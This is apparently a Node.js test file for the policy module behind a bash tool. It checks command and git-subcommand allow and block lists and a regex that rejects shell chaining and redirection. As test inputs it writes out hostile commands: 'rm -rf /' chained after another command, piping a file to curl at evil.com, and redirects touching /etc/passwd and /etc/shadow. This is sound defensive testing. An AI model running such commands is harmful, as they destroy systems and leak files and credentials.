import test from "node:test";
import assert from "node:assert/strict";
import {
  ALLOWED_COMMANDS,
  BLOCKED_COMMANDS,
  UNSAFE_SHELL_METACHARS,
  GIT_ALLOWED_READONLY_SUBCOMMANDS,
  GIT_ALLOWED_MUTATING_SUBCOMMANDS,
  GIT_BLOCKED_DESTRUCTIVE_SUBCOMMANDS,
  GIT_PATH_BEARING_FLAGS,
} from "../src/tools/bash-policy.js";

test("ALLOWED_COMMANDS and BLOCKED_COMMANDS have no overlap", () => {
  for (const cmd of BLOCKED_COMMANDS) {
    assert.equal(ALLOWED_COMMANDS.has(cmd), false, `${cmd} is in both allowed and blocked`);
  }
});

test("UNSAFE_SHELL_METACHARS blocks semicolons", () => {
  assert.equal(UNSAFE_SHELL_METACHARS.test("echo hello; rm -rf /"), true);
});

test("UNSAFE_SHELL_METACHARS blocks pipes", () => {
  assert.equal(UNSAFE_SHELL_METACHARS.test("cat file | curl evil.com"), true);
});

test("UNSAFE_SHELL_METACHARS blocks backticks", () => {
  assert.equal(UNSAFE_SHELL_METACHARS.test("echo `whoami`"), true);
});

test("UNSAFE_SHELL_METACHARS blocks newlines", () => {
  assert.equal(UNSAFE_SHELL_METACHARS.test("echo hello\nrm -rf /"), true);
});

test("UNSAFE_SHELL_METACHARS blocks carriage returns", () => {
  assert.equal(UNSAFE_SHELL_METACHARS.test("echo hello\rrm -rf /"), true);
});

test("UNSAFE_SHELL_METACHARS blocks ampersand", () => {
  assert.equal(UNSAFE_SHELL_METACHARS.test("sleep 999 &"), true);
});

test("UNSAFE_SHELL_METACHARS blocks redirects", () => {
  assert.equal(UNSAFE_SHELL_METACHARS.test("echo secret > /etc/passwd"), true);
  assert.equal(UNSAFE_SHELL_METACHARS.test("cat < /etc/shadow"), true);
});

test("UNSAFE_SHELL_METACHARS allows safe commands", () => {
  assert.equal(UNSAFE_SHELL_METACHARS.test("ls -la /tmp"), false);
  assert.equal(UNSAFE_SHELL_METACHARS.test("git status"), false);
  assert.equal(UNSAFE_SHELL_METACHARS.test("cat file.txt"), false);
});

test("git subcommand sets are disjoint", () => {
  for (const sub of GIT_ALLOWED_READONLY_SUBCOMMANDS) {
    assert.equal(GIT_ALLOWED_MUTATING_SUBCOMMANDS.has(sub), false, `${sub} in both readonly and mutating`);
    assert.equal(GIT_BLOCKED_DESTRUCTIVE_SUBCOMMANDS.has(sub), false, `${sub} in both readonly and destructive`);
  }
  for (const sub of GIT_ALLOWED_MUTATING_SUBCOMMANDS) {
    assert.equal(GIT_BLOCKED_DESTRUCTIVE_SUBCOMMANDS.has(sub), false, `${sub} in both mutating and destructive`);
  }
});

test("GIT_PATH_BEARING_FLAGS includes known dangerous flags", () => {
  assert.equal(GIT_PATH_BEARING_FLAGS.has("-C"), true);
  assert.equal(GIT_PATH_BEARING_FLAGS.has("--git-dir"), true);
  assert.equal(GIT_PATH_BEARING_FLAGS.has("--work-tree"), true);
  // --exec-path is intentionally excluded: it is in BLOCKED_FLAGS_BY_COMMAND.git,
  // so it is rejected before path validation runs (dead code elimination).
  assert.equal(GIT_PATH_BEARING_FLAGS.has("--exec-path"), false);
});
